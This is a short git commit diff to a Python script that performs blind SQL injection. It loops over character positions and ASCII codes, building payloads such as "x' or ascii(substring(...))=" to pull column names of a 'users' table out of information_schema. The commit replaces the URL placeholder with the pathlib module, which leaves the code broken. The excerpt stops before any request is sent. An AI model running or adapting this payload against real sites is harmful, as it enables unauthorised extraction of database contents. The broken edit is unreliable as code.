9f99cec62c2e7cb979edc7a3bb8ef4959dbe4c05
Deepak <nagarkotideepak9843@gmail.com>
2022-07-28 22:47:47 +0545

    sql modified

--- SQL Scripts/sql_script.py
+++ SQL Scripts/sql_script.py
@@ -1,9 +1,10 @@
 #!/usr/bin/python
+import pathlib
 import requests, sys
 
 for posi in range(1,11):
 	for chara in range(30,125):
-		url = PATH
+		url = pathlib
 		output = ""
 		pay = "(select column_name from information_schema.columns where table_name='users' limit 3,1)"
 		payload = "x' or ascii(substring("+pay+","+str(posi)+",1))="+str(chara)+"#"
